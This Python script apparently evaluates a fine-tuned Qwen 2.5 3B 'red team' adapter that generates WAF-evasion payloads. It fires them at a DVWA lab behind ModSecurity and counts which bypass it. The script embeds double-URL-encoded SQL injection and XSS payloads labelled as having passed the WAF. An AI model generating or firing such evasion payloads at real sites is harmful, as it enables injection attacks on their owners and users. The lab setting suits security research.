#!/usr/bin/env python3
"""
Quick test of Gemma Phase 3 checkpoint against DVWA ModSecurity PL1
"""
import json
import os
import sys
import httpx
import re
import torch
from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig
from peft import PeftModel
from tqdm import tqdm

# Config - Remote DVWA with hidden WAF rules
DVWA_WAF_URL = "http://modsec.llmshield.click"
DVWA_LOGIN_URL = f"{DVWA_WAF_URL}/login.php"
DVWA_SQLI_URL = f"{DVWA_WAF_URL}/vulnerabilities/sqli/"
DVWA_XSS_URL = f"{DVWA_WAF_URL}/vulnerabilities/xss_r/"
USERNAME = "admin"
PASSWORD = "password"

# Model config
MODEL_BASE = "Qwen/Qwen2.5-3B-Instruct"
ADAPTER_PATH = "experiments/red_phase3_lightweight_enhanced_qwen3b"
NUM_TESTS_PER_TYPE = 10  # Test 10 payloads per attack type

def get_dvwa_client():
    """Login to DVWA and return authenticated client"""
    client = httpx.Client(timeout=10.0, follow_redirects=True)
    try:
        print(f"   Fetching login page: {DVWA_LOGIN_URL}")
        r = client.get(DVWA_LOGIN_URL)
        
        # Try multiple token patterns
        token = None
        patterns = [
            r"user_token'\s*value='([a-f0-9]{32})'",  # Standard DVWA
            r'user_token"\s*value="([a-f0-9]{32})"',  # Double quotes
            r'name="user_token"\s*value="([^"]+)"',    # Any value with name
            r'name=\'user_token\'\s*value=\'([^\']+)\'',  # Single quotes
        ]
        
        for pattern in patterns:
            m = re.search(pattern, r.text, re.I)
            if m:
                token = m.group(1)
                print(f"   ✅ Found user_token: {token[:8]}...")
                break
        
        if not token:
            # Try login without token (some setups don't need CSRF)
            print("   ⚠️ No user_token found, trying login without CSRF token...")
            r = client.post(DVWA_LOGIN_URL, data={
                "username": USERNAME, 
                "password": PASSWORD, 
                "Login": "Login"
            })
        else:
            r = client.post(DVWA_LOGIN_URL, data={
                "username": USERNAME, 
                "password": PASSWORD, 
                "user_token": token, 
                "Login": "Login"
            })
        
        # Check if login successful (not redirected back to login page)
        if "login.php" not in str(r.url).lower():
            print("   ✅ Logged into DVWA successfully")
            print(f"   Current URL: {r.url}")
            return client
        else:
            print(f"   ❌ Login failed - still at login page")
            print(f"   Response URL: {r.url}")
            print(f"   Response length: {len(r.text)} bytes")
            return None
            
    except Exception as e:
        print(f"   ❌ Error during login: {e}")
        return None

def test_payload_on_waf(client, payload, attack_type):
    """Test payload against DVWA WAF"""
    try:
        if attack_type == "SQLI":
            url = f"{DVWA_SQLI_URL}?id={payload}&Submit=Submit"
        elif attack_type == "XSS":
            url = f"{DVWA_XSS_URL}?name={payload}"
        else:
            return None
        
        response = client.get(url)
        
        # Check if blocked by WAF (403 or ModSecurity block page)
        if response.status_code == 403:
            return "BLOCKED"
        elif "ModSecurity" in response.text or "Not Acceptable" in response.text:
            return "BLOCKED"
        else:
            return "PASSED"
    except Exception as e:
        return "ERROR"

def load_model_and_adapter(base_model, adapter_path):
    """Load base model + adapter"""
    print(f"\n📦 Loading base model: {base_model}")
    
    bnb_config = BitsAndBytesConfig(
        load_in_4bit=True,
        bnb_4bit_quant_type="nf4",
        bnb_4bit_use_double_quant=True,
        bnb_4bit_compute_dtype=torch.float16,
    )
    
    tokenizer = AutoTokenizer.from_pretrained(base_model, trust_remote_code=True)
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token
    
    model = AutoModelForCausalLM.from_pretrained(
        base_model,
        quantization_config=bnb_config,
        device_map="auto",
        trust_remote_code=True,
        torch_dtype=torch.float16,
    )
    
    print(f"🔧 Loading adapter from: {adapter_path}")
    model = PeftModel.from_pretrained(model, adapter_path)
    model.eval()
    
    return tokenizer, model

def generate_payload(tokenizer, model, attack_type, technique, include_examples=False):
    """Generate payload using Phase 3 lightweight format"""
    
    # Add realistic BLOCKED/PASSED examples if requested
    if include_examples:
        if attack_type == "SQLI":
            blocked_examples = [
                "%2527%2520OR%25201%253D1--%2520",
                "%2527%2520UNION%2520SELECT%2520NULL--%2520"
            ]
            passed_examples = [
                "%252527%252520OR%2525201%25253D1--%252520",
                "%252527%252520%252526%252526%2525201%25253D1%252523"
            ]
        else:  # XSS
            blocked_examples = [
                "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
                "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
            ]
            passed_examples = [
                "%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",
                "%253Csvg%2520onload%253Dalert%25281%2529%253E"
            ]
        
        blocked_str = json.dumps(blocked_examples, ensure_ascii=False)
        passed_str = json.dumps(passed_examples, ensure_ascii=False)
    else:
        blocked_str = "[]"
        passed_str = "[]"
    
    prompt = f"""Generate WAF-evasion payloads.

Target: {attack_type} on ModSecurity PL1.
Technique: {technique}

[Observations]
- BLOCKED: {blocked_str}
- PASSED: {passed_str}

Instruction: Generate a NEW payload using the target technique, learning from the PASSED examples if available. Output ONLY the payload."""
    
    messages = [{"role": "user", "content": prompt}]
    text = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
    
    inputs = tokenizer(text, return_tensors="pt", truncation=True, max_length=1536).to(model.device)
    
    with torch.no_grad():
        outputs = model.generate(
            **inputs,
            max_new_tokens=150,
            temperature=0.7,
            top_p=0.9,
            do_sample=True,
            use_cache=False,  # Fix for Phi-3 DynamicCache issue
            pad_token_id=tokenizer.eos_token_id
        )
    
    response = tokenizer.decode(outputs[0][inputs['input_ids'].shape[1]:], skip_special_tokens=True).strip()
    return response

def main():
    print("="*80)
    print("🧪 Testing Qwen 2.5 3B Phase 3 Lightweight Checkpoint")
    print(f"🎯 Target: {DVWA_WAF_URL} (Remote DVWA with Hidden WAF Rules)")
    print("="*80)
    
    # Check if WAF is running
    print("\n1️⃣ Checking DVWA/WAF connection...")
    client = get_dvwa_client()
    if not client:
        print(f"\n❌ DVWA not accessible at {DVWA_WAF_URL}")
        print("   Check if server is running or network connection")
        return
    
    # Load model
    print("\n2️⃣ Loading model...")
    tokenizer, model = load_model_and_adapter(MODEL_BASE, ADAPTER_PATH)
    
    # Test scenarios - mix of cold start and with examples
    test_cases = [
        # Cold start (no examples)
        ("SQLI", "Double URL Encode", False),
        ("SQLI", "Comment obfuscation", False),
        ("XSS", "Event Handler XSS", False),
        # With PASSED examples (adaptive learning)
        ("SQLI", "Boolean-based OR 1=1", True),
        ("SQLI", "UNION SELECT", True),
        ("XSS", "Script tag obfuscation", True),
        ("XSS", "IMG tag with onerror", True),
    ]
    
    results = {"PASSED": 0, "BLOCKED": 0, "ERROR": 0}
    results_by_mode = {
        "cold_start": {"PASSED": 0, "BLOCKED": 0, "ERROR": 0},
        "with_examples": {"PASSED": 0, "BLOCKED": 0, "ERROR": 0}
    }
    details = []
    
    print(f"\n3️⃣ Generating and testing {len(test_cases)} payloads...")
    print("="*80)
    
    for attack_type, technique, include_examples in tqdm(test_cases, desc="Testing"):
        mode = "with_examples" if include_examples else "cold_start"
        payload = generate_payload(tokenizer, model, attack_type, technique, include_examples)
        result = test_payload_on_waf(client, payload, attack_type)
        
        results[result] += 1
        results_by_mode[mode][result] += 1
        details.append({
            "attack_type": attack_type,
            "technique": technique,
            "mode": mode,
            "payload": payload,
            "result": result
        })
        
        status_icon = "✅" if result == "PASSED" else "🛡️" if result == "BLOCKED" else "❌"
        mode_icon = "❄️" if mode == "cold_start" else "🔥"
        print(f"\n{status_icon} {mode_icon} {attack_type} - {technique}")
        print(f"   Mode: {mode.replace('_', ' ').title()}")
        print(f"   Payload: {payload[:80]}...")
        print(f"   Result: {result}")
    
    # Summary
    print("\n" + "="*80)
    print("📊 RESULTS SUMMARY")
    print("="*80)
    total = len(test_cases)
    print(f"\n🎯 Overall Results:")
    print(f"✅ PASSED (bypassed WAF): {results['PASSED']}/{total} ({results['PASSED']/total*100:.1f}%)")
    print(f"🛡️ BLOCKED by WAF: {results['BLOCKED']}/{total} ({results['BLOCKED']/total*100:.1f}%)")
    if results['ERROR'] > 0:
        print(f"❌ ERRORS: {results['ERROR']}/{total}")
    
    # Breakdown by mode
    print(f"\n📈 Breakdown by Mode:")
    for mode, mode_results in results_by_mode.items():
        total_mode = sum(mode_results.values())
        if total_mode > 0:
            passed_pct = mode_results['PASSED']/total_mode*100
            print(f"\n  {mode.replace('_', ' ').title()} ({total_mode} tests):")
            print(f"    ✅ PASSED: {mode_results['PASSED']}/{total_mode} ({passed_pct:.1f}%)")
            print(f"    🛡️ BLOCKED: {mode_results['BLOCKED']}/{total_mode}")
    
    # Save results
    from datetime import datetime
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = f"eval_qwen3b_phase3_remote_hidden_waf_{timestamp}.json"
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump({
            "model": MODEL_BASE,
            "adapter": ADAPTER_PATH,
            "target_url": DVWA_WAF_URL,
            "waf_type": "ModSecurity (Hidden Rules - Unknown Config)",
            "timestamp": timestamp,
            "summary": results,
            "summary_by_mode": results_by_mode,
            "details": details
        }, f, indent=2, ensure_ascii=False)
    
    print(f"\n💾 Results saved to: {output_file}")
    print("="*80)
    
    client.close()

if __name__ == "__main__":
    main()
